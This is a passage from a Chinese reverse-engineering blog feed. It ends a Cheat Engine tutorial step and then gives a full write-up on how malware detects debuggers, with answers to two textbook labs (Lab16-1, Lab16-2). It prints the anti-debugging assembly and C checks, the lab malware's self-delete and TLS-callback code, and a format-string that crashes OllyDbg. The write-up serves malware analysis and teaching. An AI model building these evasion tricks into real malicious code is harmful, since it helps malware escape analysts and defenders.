class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">步骤2:精确值扫描(PW=090453)</span><br>现在您已经打开了使用Cheat Engine的教程，让我们继续下一步。<br><br><span class="hljs-section">您可以在这个窗口的底部看到文本Health: xxx</span><br>每次你点击“打我”，你的健康就会下降。<br><br>要进入下一步，必须找到这个值并将其更改为1000<br><br><span class="hljs-section">要找到这个值有不同的方法，但我要告诉你最简单的“精确值”:</span><br>首先，确保值类型设置为至少2字节或4字节。1字节也可以，但是当你找到地址并想要修改它时，你会遇到一个很容易解决的问题。如果地址后面的字节是0，那么8字节也许可以工作，但是我不会打赌。<br>单扫描、双扫描和其他扫描不起作用，因为它们以不同的方式存储值。<br><br>当正确设置值类型时，请确保scantype设置为“精确值”<br>然后在数值框中填写您的健康状况。然后点击“第一次扫描”<br>过了一段时间(如果你的电脑很慢)，扫描就完成了，结果显示在左边的列表中<br><br>如果你找到一个以上的地址，但你不确定是哪个，点击“点击我”，在“值”框中填写新的健康值，然后点击“下一步扫描”<br>重复这个步骤，直到你确定找到了为止。(包括列表中只有一个地址…)<br><br>现在双击左边列表中的地址。这将使地址在底部的列表中弹出，显示当前值。<br>双击该值(或选择该值并按enter)，将该值更改为1000。<br><br>如果一切顺利，next按钮应该会启用，您已经为下一步做好了准备。<br><br><span class="hljs-section">注意:</span><br>如果你在扫描时做错了什么，点击“新建扫描”，再次扫描。<br>另外，试着修改这个值，然后点击“hit me”<br></code></pre></td></tr></table></figure><p>根据窗口内提示，将健康值填入扫描值中：</p><p><img src="https://i.loli.net/2019/03/29/5c9d8c484e9fc.png"></p><p>点击Scan：</p><p><img src="https://i.loli.net/2019/03/29/5c9d8c895c180.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>反调试技术</title>
    <link href="/2019/03/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"/>
    <url>/2019/03/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>反调试技术，恶意代码用它来识别自身是否被调试，或者让调试器失效，或者通过反调试技术盐城分析人员对代码的分析时间，为了组织调试器的分析，当恶意代码意识到自己被调试时，他们可能改变正常的执行路径或者修改自身程序让自己崩溃，从而增加调试时间和复杂度。</p><p><strong>探测Windows调试器：</strong>恶意代码会使用多种技术探测调试器调试它的痕迹，其中包括使用Windows API、手动检测调试器人工痕迹的内存结构，查询调试器遗留在系统中的痕迹等。调试器探测时恶意代码常用的反调试技术。</p><p><strong>使用Windows API函数：</strong>使用Windows API函数探测调试器是否存在时最简单的反调试技术，Windows提供了一些函数可以让应用程序调用这些API来探测自己是否被调试。这些API中有些时专门来探测调试器存在的，而另一些API时处于其他目的而设计的。通常方式恶意代码使用API函数进行反调试的最简单方法是在恶意代码运行期间修改恶意代码，使其不能调用探测调试器的API函数，或者修改这些函数的返回值，也可以通过挂钩这些函数，如使用rootkit技术，下列时恶意代码常用来探测调试器的API函数：</p><ul><li><code>IsDebuggerPresent</code>：这是探测调试器最简单的API函数。它查询进程环境块（PEB）中的<code>IsDebugged</code>标志。如果进程没有运行在调试环境中，则函数返回0，否侧返回一个非0值。</li><li><code>CheckRemoteDebuggerPresent</code>：这个函数跟<code>IsDebuggerPresent</code>很类似，它也查询进程环境块（PEB）中的<code>IsDebugged</code>标志。它可以探测自身进程或者系统其它进程是被调试，这个函数将一个句柄作为参数，检查这个句柄对应的进程是否被其他调试器附加。</li><li><code>NtQueryInformationProcess</code>：这个函数时<code>Ntdll.dll</code>中的一个原生态API，它用来提取一个进程的信息，他的第一个参数是进程句柄，第二个参数告诉我们它需要提取进程信息的类型，例如将该参数设置为哦<code>ProcessDebugPort</code>，将会告诉你这个句柄标识的进程是否被调试。如果进程正在被调试，则返回被调试的端口，否则返回0.</li><li><code>OutputDebugString</code>：这个函数的作用是在调试器中显示一个字符串，先通过<code>SetLastError</code>函数为当前的错误码设置一个随机的值，然后调用<code>OutputDebugString</code>，如果当前进程没有被调试则<code>OutputDebugString</code>的调用不会影响错误码的值。</li></ul><span id="more"></span><p><strong>手动检测数据结构：</strong>手动检测数据是恶意代码编写者最常用的方法。因为很多时候通过Windows API实现的反调试技术无效，例如这些函数被rootkit挂钩，并返回错误信息，因此，恶意代码编写者经常手动执行这些与API功能相同的操作:</p><ul><li>检测<code>BeingDebugged</code>属性：</li></ul><p>Windows操作系统维护者每个正在运行进程的PEB结构，它包含与这个进程相关的所有用户态参数，这些参数包括进程环境数据，环境数据包括环境变量、加载的模块列表、内存地址、调试器状态，例如如下的两种检测方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">//mov 方法<br>mov eax, dword ptr fs:[30h]<br>mov ebx, byte ptr [eax+2]<br>test ebx, ebx   //检测BeingDebugged属性<br>jz NoDebuggerDetected<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">//push /pop 方法<br>push dword ptr fs:[30h]<br>pop edx<br>cmp byte ptr [edx+2], 1   //检测BeingDebugged属性<br>je DebuggerDetected<br></code></pre></td></tr></table></figure><p>以上两种方法都是通过将PEB的基地址载入EAX寄存器中然后对比响应标志的值来判断，这种检查由多种形式，对于这种检测方法我们可以在执行跳转指令之前修改0标志，强制执行跳转或者不跳转，或者手动设置<code>BeingDebugged</code>属性值为0，另外OD中一些插件可以帮助我们修改<code>BeingDebugged</code>标志，其中流行的有<code>Hide</code> <code>Debugger</code>、<code>Hidedebuging</code>和<code>PhantOm</code>。</p><ul><li>检测<code>ProcessHeap</code>属性：</li></ul><p><code>Reserved4</code>数组中有一个未公开的位置叫做<code>ProcessHeap</code>，他被设置为加载器为进程分配的第一个堆的位置。<code>ProcessHeap</code>位于<code>PEB</code>结构的<code>0x18</code>处。第一个堆头部有一个属性字段，它告诉内核这个堆是否在调试器中创建，这些属性叫<code>ForceFlags</code>和<code>Flags</code>，如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov eax, large fs:30h<br>mov eax, dword ptr [eax+18h]<br>cmp dword ptr ds:[eax+10h], 0<br>jne DebuggerDetected<br></code></pre></td></tr></table></figure><p>对于这种反调试技术最贱的方法是使用手动修改<code>ProcessHeap</code>，或者使用调试器的隐藏调试插件，如果使用<code>WinDbg</code>来调试可以禁用调试堆栈来启动进程。</p><ul><li>检测<code>NTGlobalFlag</code>：</li></ul><p>对于调试器中启动进程与正常模式下启动进程的不同，所有它们创建内存堆的方式也不同，系统使用PEB结构偏移量<code>0x68</code>处的一个未公开位置来决定如何创建堆结构。如果这个位置的值为<code>0x70</code>，我们就知道进程正运行在调试器中。如果进程从调试器启动则进程的如下标志被设置：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">(FLG_HEAP_ENABLE_TAIL_CHECK|<span class="hljs-type">FLG_HEAP_ENABLE_FREE_CHECK</span>|<span class="hljs-type">FLG_HEAP_VALIDATE_PARAMETERS</span>)<br></code></pre></td></tr></table></figure><p><code>NTGlobalFlag</code>检测代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov eax,large fs:30h<br>cmp dword ptr ds:[eax+68h],70h<br>jz DebuggerDetected<br></code></pre></td></tr></table></figure><p>对抗这种反调试措施的方法与上面一样。</p><p><strong>系统痕迹检测：</strong>调试器工具回在系统中留下一些痕迹，如以下是调试器在注册表中的一个常用位置：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug<br></code></pre></td></tr></table></figure><p>改注册表指定当应用程序发生错误时触发哪一个调试器，默认情况下，他被设置为<code>Dr.Watson</code>。如果注册表的键值被修改为<code>OllyDbg</code>则代表他可能正在被调试，恶意代码也可能会遍历文件系统来查找系统中是否存在调试器的可执行文件，或者查看当前进程列表，更普遍的做法是使用<code>FindWindow</code>来查找调试器：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(FindWindow(<span class="hljs-string">&quot;OllyDbg&quot;</span>,<span class="hljs-number">0</span>) == <span class="hljs-literal">NULL</span>)<br>&#123;<br>    <span class="hljs-comment">//未发现调试器</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-comment">//发现调试器</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>识别调试器行为：</strong>在逆向工程中，为了帮助分析人员进行分析，可以使用调试器设置一个断点或者单步执行一个进程，但是在调试器执行这些操作是，会修改进程中的代码，这也为反调试的技术实现提供了一个思路。</p><p><strong>INT扫描：</strong>调试器设置断点的基本机制是使用软件中断指令<code>INT 3</code>，临时替换运行程序中的一条指令，然后当程序运行到这条指令时，调用调试器异常处理例程。除了特定的断点指令<code>INT 3</code>以外 <code>INT immediate</code>指令可以设置任意中断。此指令使用两个操作码<code>0xCD value</code>但是调试器不常使用这种双字节的机器码，以下是扫描代码断点的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">call $+5<br>pop edi<br>sub edi, 5<br>mov ecx, 400h<br>mov eax, 0CCh<br>repne scasb<br>jz DebuggerDetected<br></code></pre></td></tr></table></figure><p>逐段代码首先执行一个函数调用，随后用pop指令将EIP的寄存器的值存入EDI，然后将EDI设为代码的开始位置。接下来扫描这段代码的<code>0xCC</code>字节。如果发现了<code>0xCC</code>字节则证明存在调试器。可使用硬件断点若不是软件断点来对抗这种措施。</p><p><strong>执行代码校验和检查：</strong>恶意代码可以计算代码段的校验并实现与扫描INT中断相同的目的。与扫描<code>0xCC</code>不同，这种检查仅执行恶意代码中的机器码的CRC（循环冗余校验）或者MD5校验和检查，虽然这种技术不如<code>INT 3</code>扫描那么常见没但是他同样有效，可以通过硬件断点，或者在代码运行过程中用调试器手动修改执行路径来对抗这种反调试技术。</p><p><strong>时钟检测：</strong>被调试时进程的运行速度大大降低，如下是使用时钟检测来探测调试器存在的方法：</p><ul><li>记录一段操作前后的时间戳，然后比较这两个时间戳，如果存在滞后则代表调试器存在。</li><li>记录触发一个异常前后的时间戳。如果不调试进程，可以很快处理该异常，调试器处理异常会造成很大的时间延迟，尽管我们可以用调试器忽略异常，但是这样的操作依然存在很大的延迟。</li></ul><p><strong>使用rdstc指令：</strong>较常用的时钟检测方法是使用<code>rdstc</code>指令（操作码<code>0x0F31</code>）它返回至操作系统重新启动以来的时钟数，并且将其作为一个64位的值存储在<code>EDX:EAX</code>中，恶意代码运行两次<code>rdstc</code>指令并比较这两次读数之间的差值。</p><p><strong>使用QueryPerFormanceCounter和GetTickCount：</strong>同<code>rdstc</code>一样，这两个Windows API函数也被用来执行一个反调试时钟检测，使用这种方法的前提是处理器有高分辨能力的计数器–寄存器，他能存储处理器活跃的时钟数，<code>GetTickCount</code>函数返回最近系统重启时间与当前时间的相差毫秒数。</p><p>对抗以上时钟检测方法的是在时钟检测函数之后设置断点，或者强制修改时间的对比结果。</p><p><strong>干扰调试器的功能：</strong>代码可鞥会使用一些技术来干扰调试器的正常运行，例如：线程本地存储（TLS）回调、异常、插入中断等。这些技术仅当程序处于调试器控制之下才视图扰乱程序的运行。</p><p><strong>使用TLS回调：</strong>实际上并不是程序在加载到调试器后，会让第一条指令执行之前而暂停程序的运行，而是调试器从程序PE头部指定的入口点开始。TLS回调被用来在程序入口点执行之前运行代码，因为这些代码可以在调试器中秘密地执行。</p><p>TLS是Windows的一个存储类，其中数据对象不是一个自动的堆栈变量，而是代码中运行的每个线程的一个本地变量，TLS允许每个线程维护一个用TLS声明的专有变量，在应用程序实现TLS的情况下，可执行程序的PE头部会包含一个<code>.tls</code>段。TLS提供了初始化和终止TLS对象的回调函数。使用<code>PEView</code>可以看到<code>.tls</code>段，正常程序不会使用这个段。可以使用调试器在TLS回调函数运行之前下断点来分析这些函数。</p><p><strong>使用异常：</strong>调试器利用中断产生异常，来执行类似于断点的操作。修改SEH链可以应用在对抗反汇编和反调试的技术中。恶意代码可以使用异常来破坏或者探测调试器，调试器捕获异常后，并不会将处理权返回被调试的进程处理，大多数利用异常的反调试技术往往利用这一点来探测调试器，如果调试器不能将异常结果正确的返回到被调试的进程，呢么这种异常失效可以被进程内部的异常处理机制所探测。对抗这种反调试措施的方法是设置调试器将异常的处理权返还给应用程序。</p><p><strong>插入中断：</strong></p><ul><li><p>插入INT 3：调试器使用<code>INT 3</code>来设置软件断点，所以一种反调试技术是在合法代码中插入<code>0xCC</code>欺骗调试器，使其一位这些<code>0xCC</code>是自己设置的断点，一些调试器使用跟踪自身设置的断点的方法来避免这种反调试技术。双字节操作码<code>0xCD03</code>也可以产生INT 3中断，这是代码干扰<code>WinDbg</code>调试器的有效方法，在调试器外，<code>0xCD03</code>指令产生一个<code>STATUS_BREAKPOINT</code>异常。</p></li><li><p>插入INT 2D断点：<code>INT 2D</code>反调试技术的功能与<code>INT 3</code>类似，但是<code>INT 0x2D</code>指令能够用来探测内核态的调试器。</p></li><li><p>插入ICE断点：片内仿真器（ICE）断点指令<code>icebp</code>（操作码<code>0xF1</code>）是Intel未公开的指令之一。由于ICE难以在任意位置设置断点，所以<code>icebp</code>指令被设计用来境地使用ICE设置断点的难度。运行<code>icebp</code>指令将会产生一个单步异常，如果通过单步调试跟踪程序，调试器会认为这是单步调试产生的异常，从而不中兴先前设置的异常处理例程，利用这一点，恶意代码使用异常处理例程作为它的正常执行流程，而在这种情况下，会被反调试技术干扰。为了防止这种反调试技术，指令<code>icebp</code>指令时不要使用单步调试。</p></li></ul><p><strong>调试器漏洞：</strong>与所有软件一样，调试器也存在漏洞，有时恶意代码编写者为了防止被调试会攻击这些漏洞。</p><p><strong>PE头漏洞：</strong>第一种技术使修改二进制可执行文件的PE头，当<code>OllyDbg</code>调试器加载修改后的二进制文件时会导致<code>OllyDbg</code>崩溃，结果是错误：<code>“Band or Unknown 32-bit Executable File”</code>，但是程序在调试器外运行时一切正常。</p><p><strong>OutputDebugString漏洞：</strong>恶意代码尝试利用<code>OllyDbg 1.1</code>的格式化字符串漏洞，为<code>OutputDebugString</code>函数提供一个<code>%S</code>参数，让OD崩溃,如程序中出现如下调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">OutputDebugString(<span class="hljs-string">&quot;%s%s%s%s%s%s%s%s%s%s%s&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab16-1"><a href="#Lab16-1" class="headerlink" title="Lab16-1"></a>Lab16-1</h3><p><strong>使用一款调试器分析Lab16-01.exe的恶意代码。Lab16-01.exe是与Lab09-01.exe相同的恶意代码，不同点在于Lab16-01.exe加入了反调试技术。</strong></p><p><strong>问题</strong><br><strong>1.这个恶意代码使用了哪些反调试技术？</strong></p><p>程序中有很多如下结构的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00403554                 mov     eax, large fs:30h<br>.text:0040355A                 mov     bl, [eax+2]<br>.text:0040355D                 mov     [ebp+var_1820], bl<br>.text:00403563                 movsx   eax, [ebp+var_1820]<br>.text:0040356A                 test    eax, eax<br>.text:0040356C                 jz      short loc_403573<br>.text:0040356E                 call    Del_Self_sub_401000<br>.text:00403573 ; ------------------------------------------------------------------------<br>.text:00403573                 mov     eax, large fs:30h<br>.text:00403579                 mov     eax, [eax+18h]<br>.text:0040357C                 db      3Eh<br>.text:0040357C                 mov     eax, [eax+10h]<br>.text:00403580                 mov     [ebp+var_1824], eax<br>.text:00403586                 cmp     [ebp+var_1824], 0<br>.text:0040358D                 jz      short loc_403594<br>.text:0040358F                 call    Del_Self_sub_401000<br>.text:00403594 ; ------------------------------------------------------------------------<br>.text:00403594                 mov     eax, large fs:30h<br>.text:0040359A                 db      3Eh<br>.text:0040359A                 mov     eax, [eax+68h]<br>.text:0040359E                 sub     eax, 70h<br>.text:004035A1                 mov     [ebp+var_1828], eax<br>.text:004035A7                 cmp     [ebp+var_1828], 0<br>.text:004035AE                 jnz     short loc_4035B5<br>.text:004035B0                 call    Del_Self_sub_401000<br></code></pre></td></tr></table></figure><p>恶意代码通过检测<code>BeingDebugged</code>、<code>ProcessHeap</code>、<code>NTGlobalFlag</code>的值来检测自身是否被调试。</p><p><strong>2.当每种反调试技术成功执行时，有什么现象？</strong></p><p>程序会执行自我删除。</p><p><strong>3.如何应对这些反调试技术？</strong></p><p>这些反调试措施是检测API中的数据结构的值，我们只要在对比之后修改标志寄存器的值使程序以为我们并没有调试它。</p><p><strong>4.如何在调试过程中手动修改检测的数据结构？</strong></p><p>单步步进修改这些数据结构的值。</p><p><strong>5.哪一种OllyDbg插件可以帮你逃避恶意代码的反调试技术？</strong></p><p><code>PhantOM</code>和<code>Immunity Pycommand hidedebug</code>。</p><h3 id="Lab16-2"><a href="#Lab16-2" class="headerlink" title="Lab16-2"></a>Lab16-2</h3><p><strong>使用调试器分析恶意代码Lab16-02.exe.本实验的目的是找出正确的密码。另外，恶意代码不会放弃使用攻击负载（payload）。</strong></p><p><strong>问题</strong></p><p><strong>1.在命令行中运行Lab16-02.exe时会发生什么？</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:&gt;Lab16-<span class="hljs-number">02</span>.exe<br><span class="hljs-attribute">usage</span>: Lab16-<span class="hljs-number">02</span>.exe &lt;<span class="hljs-number">4</span> character password&gt;<br></code></pre></td></tr></table></figure><p><strong>2.当使用猜测的命令行参数运行Lab16-02.exe时会发生什么？</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:&gt;Lab16-<span class="hljs-number">02</span>.exe <span class="hljs-number">1234</span><br><span class="hljs-attribute">Incorrect</span> password, Try again.<br></code></pre></td></tr></table></figure><p><strong>3.命令行密码是什么？</strong></p><p><code>byrr</code></p><p><strong>4.使用IDA Pro加载Lab16-02.exe，在main函数的何处可以找到strncmp函数？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">.tls:0040122C                 push    4               ; size_t<br>.tls:0040122E                 push    offset aP       ; char *<br>.tls:00401233                 mov     eax, [ebp+argv]<br>.tls:00401236                 mov     ecx, [eax+4]<br>.tls:00401239                 push    ecx             ; char *<br>.tls:0040123A                 call    _strncmp<br></code></pre></td></tr></table></figure><p><strong>5.在默认设置下，将这个恶意代码加载到OllyDbg中会发生什么？</strong></p><p><img src="https://i.loli.net/2019/03/27/5c9b7845ac225.png"></p><p><strong>6.Lab16-02.exe中PE结构的独特之处是什么？</strong></p><p>该程序有<code>.tls</code>段:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">Name</span><span class="hljs-string">Start</span><span class="hljs-string">End</span><span class="hljs-string">R</span><span class="hljs-string">W</span><span class="hljs-string">X</span><span class="hljs-string">D</span><span class="hljs-string">L</span><span class="hljs-string">Align</span><span class="hljs-string">Base</span><span class="hljs-string">Type</span><span class="hljs-string">Class</span><span class="hljs-string">AD</span><span class="hljs-string">es</span><span class="hljs-string">ss</span><span class="hljs-string">ds</span><span class="hljs-string">fs</span><span class="hljs-string">gs</span><br><span class="hljs-string">.tls</span><span class="hljs-number">00401000</span><span class="hljs-number">00402000</span><span class="hljs-string">R</span><span class="hljs-string">.</span><span class="hljs-string">X</span><span class="hljs-string">.</span><span class="hljs-string">L</span><span class="hljs-string">para</span><span class="hljs-number">0001</span><span class="hljs-string">public</span><span class="hljs-string">CODE</span><span class="hljs-number">32</span><span class="hljs-number">0000</span><span class="hljs-number">0000</span><span class="hljs-number">0004</span><span class="hljs-string">FFFFFFFF</span><span class="hljs-string">FFFFFFFF</span><br><span class="hljs-string">.text</span><span class="hljs-number">00402000</span><span class="hljs-number">00407000</span><span class="hljs-string">R</span><span class="hljs-string">.</span><span class="hljs-string">X</span><span class="hljs-string">.</span><span class="hljs-string">L</span><span class="hljs-string">para</span><span class="hljs-number">0002</span><span class="hljs-string">public</span><span class="hljs-string">CODE</span><span class="hljs-number">32</span><span class="hljs-number">0000</span><span class="hljs-number">0000</span><span class="hljs-number">0004</span><span class="hljs-string">FFFFFFFF</span><span class="hljs-string">FFFFFFFF</span><br><span class="hljs-string">.idata</span><span class="hljs-number">00407000</span><span class="hljs-string">004070C8</span><span class="hljs-string">R</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">L</span><span class="hljs-string">para</span><span class="hljs-number">0003</span><span class="hljs-string">public</span><span class="hljs-string">DATA</span><span class="hljs-number">32</span><span class="hljs-number">0000</span><span class="hljs-number">0000</span><span class="hljs-number">0004</span><span class="hljs-string">FFFFFFFF</span><span class="hljs-string">FFFFFFFF</span><br><span class="hljs-string">.rdata</span><span class="hljs-string">004070C8</span><span class="hljs-number">00408000</span><span class="hljs-string">R</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">L</span><span class="hljs-string">para</span><span class="hljs-number">0003</span><span class="hljs-string">public</span><span class="hljs-string">DATA</span><span class="hljs-number">32</span><span class="hljs-number">0000</span><span class="hljs-number">0000</span><span class="hljs-number">0004</span><span class="hljs-string">FFFFFFFF</span><span class="hljs-string">FFFFFFFF</span><br><span class="hljs-string">.data</span><span class="hljs-number">00408000</span><span class="hljs-string">0040C000</span><span class="hljs-string">R</span><span class="hljs-string">W</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">L</span><span class="hljs-string">para</span><span class="hljs-number">0004</span><span class="hljs-string">public</span><span class="hljs-string">DATA</span><span class="hljs-number">32</span><span class="hljs-number">0000</span><span class="hljs-number">0000</span><span class="hljs-number">0004</span><span class="hljs-string">FFFFFFFF</span><span class="hljs-string">FFFFFFFF</span><br></code></pre></td></tr></table></figure><p><strong>7.回调（callback）发生在哪些位置？（提示：在IDA Pro中使用Ctrl+E组合键）</strong></p><p><img src="https://i.loli.net/2019/03/27/5c9b7b198d3f6.png"></p><p><strong>8.恶意代码使用哪一种反调试技术使它在调试器中立即终止运行？如何避免这种检查？</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __stdcall <span class="hljs-title function_">TlsCallback_0</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">1</span> &amp;&amp; FindWindowA(ClassName, <span class="hljs-number">0</span>) )   <span class="hljs-comment">// OLLYDBG</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">2</span> )<br>    sub_401020();<br>&#125;<br></code></pre></td></tr></table></figure><p>在调试器中修改函数返回值，或者修改跳转逻辑。</p><p><strong>9.当你禁用反调试技术后，你在调试器中看到的命令行密码是什么？</strong></p><p>在我Win10虚拟机中的OD默认设置了在TLS调用前的断点：</p><p><img src="https://i.loli.net/2019/03/27/5c9b7d6eb430a.png"></p><p><img src="https://i.loli.net/2019/03/27/5c9b7f9898c26.png"></p><p><strong>10.调试器中找到的密码在命令行中运行有效吗？</strong></p><p>肯定是无效的，这里恶意代码采用了两个不同的执行流程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">DWORD __stdcall <span class="hljs-title function_">StartAddress</span><span class="hljs-params">(LPVOID lpThreadParameter)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// ebx</span><br><br>  byte_408032 = <span class="hljs-number">4</span> * __ROL1__(<span class="hljs-number">7</span>, <span class="hljs-number">6</span>);<br>  byte_408032 ^= <span class="hljs-number">63u</span>;<br>  byte_408032 *= <span class="hljs-number">2</span>;<br>  aP[<span class="hljs-number">0</span>] = __ROL1__(<span class="hljs-number">-112</span>, <span class="hljs-number">2</span>);<br>  aP[<span class="hljs-number">1</span>] = byte_40A968 + __ROL1__(<span class="hljs-number">22</span>, <span class="hljs-number">6</span>);<br>  aP[<span class="hljs-number">1</span>] *= <span class="hljs-number">2</span>;<br>  byte_408033 = <span class="hljs-number">56</span>;<br>  byte_408032 = __ROR1__(byte_408032, <span class="hljs-number">7</span>);<br>  v1 = __readfsdword(<span class="hljs-number">0x30</span>u);<br>  aP[<span class="hljs-number">1</span>] = __ROL1__(aP[<span class="hljs-number">1</span>], <span class="hljs-number">4</span>);<br>  aP[<span class="hljs-number">0</span>] = __ROR1__(__ROL1__(<span class="hljs-number">-112</span>, <span class="hljs-number">2</span>), <span class="hljs-number">3</span>);<br>  aP[<span class="hljs-number">0</span>] ^= <span class="hljs-number">0xD</span>u;<br>  aP[<span class="hljs-number">1</span>] = __ROR1__(aP[<span class="hljs-number">1</span>], <span class="hljs-number">5</span>);<br>  byte_408032 ^= <span class="hljs-number">0xAB</span>u;<br>  byte_408033 = __ROR1__(__ROR1__(<span class="hljs-number">-3</span>, <span class="hljs-number">4</span>), <span class="hljs-number">1</span>);<br>  byte_408032 = __ROR1__(byte_408032, <span class="hljs-number">2</span>);<br>  aP[<span class="hljs-number">1</span>] = __ROR1__(aP[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>);<br>  aP[<span class="hljs-number">1</span>] ^= <span class="hljs-number">0xFE</span>u;<br>  aP[<span class="hljs-number">0</span>] = __ROL1__(aP[<span class="hljs-number">0</span>], <span class="hljs-number">6</span>);<br>  aP[<span class="hljs-number">0</span>] ^= <span class="hljs-number">0x72</span>u;<br>  LOBYTE(v1) = *(_BYTE *)(v1 + <span class="hljs-number">2</span>);<br>  aP[<span class="hljs-number">1</span>] = __ROL1__(aP[<span class="hljs-number">1</span>], <span class="hljs-number">1</span>);<br>  byte_408033 ^= <span class="hljs-number">0x80</span>u;<br>  byte_408033 = __ROL1__(byte_408033, <span class="hljs-number">7</span>);<br>  byte_408032 += v1;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">4</span>; i; --i )<br>  &#123;<br>    v3 = i - <span 